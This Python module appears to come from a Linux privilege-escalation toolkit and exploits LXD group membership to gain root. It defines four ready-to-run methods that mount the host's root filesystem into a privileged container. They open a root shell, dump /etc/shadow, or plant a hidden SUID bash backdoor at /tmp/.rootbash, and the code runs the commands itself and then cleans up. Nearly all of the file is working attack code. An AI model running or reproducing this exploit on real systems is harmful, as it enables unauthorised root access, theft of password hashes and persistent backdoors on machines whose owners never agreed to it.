"""
LXD/LXC Group Exploitation
==========================

Exploit LXD group membership for root access via privileged containers.

How it works:
1. LXD group can create and manage LXC containers
2. Create a privileged container (security.privileged=true)
3. Mount host filesystem into container
4. Access host as root from within container
"""

import os
from typing import Optional, List

from .base import BaseGroupExploit
from ..core.groups import GroupFinding, ExploitResult, ExploitStatus


class LXDExploit(BaseGroupExploit):
    """
    Exploit LXD group membership.

    Requires LXD to be initialized.
    Success rate: ~95%
    """

    METHODS = [
        {
            'name': 'privileged_container',
            'description': 'Create privileged container with host filesystem mounted',
            'commands': [
                'lxc init images:alpine/edge privesc -c security.privileged=true',
                'lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true',
                'lxc start privesc',
                'lxc exec privesc /bin/sh'
            ],
            'interactive': True
        },
        {
            'name': 'alpine_builder',
            'description': 'Build custom Alpine image for exploitation',
            'commands': [
                'git clone https://github.com/saghul/lxd-alpine-builder',
                'cd lxd-alpine-builder && sudo ./build-alpine',
                'lxc image import ./alpine*.tar.gz --alias myimage',
                'lxc init myimage privesc -c security.privileged=true',
                'lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true',
                'lxc start privesc',
                'lxc exec privesc /bin/sh'
            ],
            'interactive': True
        },
        {
            'name': 'read_shadow',
            'description': 'Read /etc/shadow from host via LXD',
            'commands': [
                'lxc init images:alpine/edge reader -c security.privileged=true',
                'lxc config device add reader host-root disk source=/ path=/mnt/root recursive=true',
                'lxc start reader',
                'lxc exec reader cat /mnt/root/etc/shadow'
            ],
            'interactive': False
        },
        {
            'name': 'suid_bash',
            'description': 'Create SUID bash via LXD',
            'commands': [
                'lxc init images:alpine/edge suid -c security.privileged=true',
                'lxc config device add suid host-root disk source=/ path=/mnt/root recursive=true',
                'lxc start suid',
                'lxc exec suid -- sh -c "cp /mnt/root/bin/bash /mnt/root/tmp/.rootbash && chmod 4755 /mnt/root/tmp/.rootbash"',
                'lxc stop suid && lxc delete suid'
            ],
            'interactive': False,
            'post_exploit': '/tmp/.rootbash -p'
        }
    ]

    def __init__(self, finding: GroupFinding, verbose: bool = False):
        super().__init__(finding, verbose)
        self._initialized = None

    def check_available(self) -> bool:
        """Check if LXD exploitation is possible"""
        # Check if lxc binary exists
        if not self.check_binary_exists('lxc'):
            self.log("LXC binary not found", "error")
            return False

        self.log("LXC binary found", "success")

        # Check if LXD is initialized
        if not self._check_lxd_initialized():
            self.log("LXD not initialized", "warning")
            self._initialized = False
        else:
            self.log("LXD is initialized", "success")
            self._initialized = True

        return True

    def _check_lxd_initialized(self) -> bool:
        """Check if LXD is initialized"""
        returncode, _, _ = self.run_command('lxc list', timeout=10)
        return returncode == 0

    def _initialize_lxd(self) -> bool:
        """Initialize LXD with default settings"""
        self.log("Initializing LXD...", "info")

        returncode, stdout, stderr = self.run_command('lxd init --auto', timeout=60)

        if returncode == 0:
            self.log("LXD initialized successfully", "success")
            self._initialized = True
            return True
        else:
            self.log(f"LXD initialization failed: {stderr}", "error")
            return False

    def _check_image_available(self) -> bool:
        """Check if Alpine image is available"""
        returncode, stdout, _ = self.run_command('lxc image list')
        return 'alpine' in stdout.lower()

    def get_methods(self) -> List[dict]:
        """Get available LXD exploitation methods"""
        return self.METHODS

    def exploit(
            self,
            method: Optional[str] = None,
            interactive: bool = False
    ) -> ExploitResult:
        """
        Execute LXD exploitation.

        Args:
            method: Specific method to use
            interactive: Allow interactive shell

        Returns:
            ExploitResult
        """
        self.log("Attempting LXD group exploitation...", "info")

        # Check availability
        if not self.check_available():
            return ExploitResult(
                finding=self.finding,
                method="N/A",
                status=ExploitStatus.ERROR,
                error="LXD not available"
            )

        # Initialize LXD if needed
        if not self._initialized:
            self.log("LXD needs initialization", "warning")

            if interactive:
                choice = input("Initialize LXD now? [y/N]: ")
                if choice.lower() == 'y':
                    if not self._initialize_lxd():
                        return ExploitResult(
                            finding=self.finding,
                            method="N/A",
                            status=ExploitStatus.ERROR,
                            error="Failed to initialize LXD"
                        )
                else:
                    return ExploitResult(
                        finding=self.finding,
                        method="N/A",
                        status=ExploitStatus.MANUAL,
                        output="Run: lxd init --auto"
                    )
            else:
                return ExploitResult(
                    finding=self.finding,
                    method="N/A",
                    status=ExploitStatus.MANUAL,
                    output="LXD needs initialization. Run: lxd init --auto"
                )

        # Select method
        if method:
            selected = next((m for m in self.METHODS if m['name'] == method), None)
            if not selected:
                return ExploitResult(
                    finding=self.finding,
                    method=method,
                    status=ExploitStatus.ERROR,
                    error=f"Unknown method: {method}"
                )
        else:
            # Default method
            if interactive:
                selected = self.METHODS[0]  # privileged_container
            else:
                selected = self.METHODS[3]  # suid_bash

        self.log(f"Using method: {selected['name']}", "info")

        # Handle interactive methods
        if selected.get('interactive') and not interactive:
            self.log("Method requires interactive shell", "warning")
            self.print_methods()

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.MANUAL,
                output=f"Run commands manually:\n" + "\n".join(selected['commands'])
            )

        # Execute exploitation
        return self._execute_method(selected, interactive)

    def _execute_method(self, method: dict, interactive: bool) -> ExploitResult:
        """Execute a specific exploitation method"""
        commands = method['commands']

        # For interactive methods, run all but last command, then exec last
        if method.get('interactive') and interactive:
            # Run setup commands
            for cmd in commands[:-1]:
                self.log(f"Running: {cmd}", "info")
                returncode, stdout, stderr = self.run_command(cmd, timeout=120)

                if returncode != 0:
                    self.log(f"Command failed: {stderr}", "error")
                    return ExploitResult(
                        finding=self.finding,
                        method=method['name'],
                        status=ExploitStatus.FAILED,
                        error=stderr
                    )

            # Execute final interactive command
            self.log("Launching interactive shell...", "success")
            os.system(commands[-1])

            return ExploitResult(
                finding=self.finding,
                method=method['name'],
                status=ExploitStatus.SUCCESS,
                got_root=True
            )
        else:
            # Non-interactive: run all commands
            output = []

            for cmd in commands:
                self.log(f"Running: {cmd}", "info")
                returncode, stdout, stderr = self.run_command(cmd, timeout=120)
                output.append(stdout)

                if returncode != 0:
                    self.log(f"Command failed: {stderr}", "error")
                    return ExploitResult(
                        finding=self.finding,
                        method=method['name'],
                        status=ExploitStatus.FAILED,
                        error=stderr
                    )

            self.log("Exploitation successful!", "success")

            artifacts = []

            if 'suid_bash' in method['name']:
                artifacts.append('/tmp/.rootbash')
                self.log("SUID bash created at /tmp/.rootbash", "success")
                self.log("Run: /tmp/.rootbash -p", "info")

            if 'shadow' in method['name']:
                self.log("Shadow file contents:", "success")
                print(output[-1])

            return ExploitResult(
                finding=self.finding,
                method=method['name'],
                status=ExploitStatus.SUCCESS,
                output="\n".join(output),
                got_root=True,
                artifacts=artifacts
            )

    def cleanup(self) -> None:
        """Clean up created containers"""
        self.log("Cleaning up LXD containers...", "info")

        containers = ['privesc', 'reader', 'suid']

        for container in containers:
            self.run_command(f'lxc stop {container} 2>/dev/null')
            self.run_command(f'lxc delete {container} 2>/dev/null')

        self.log("Cleanup complete", "success")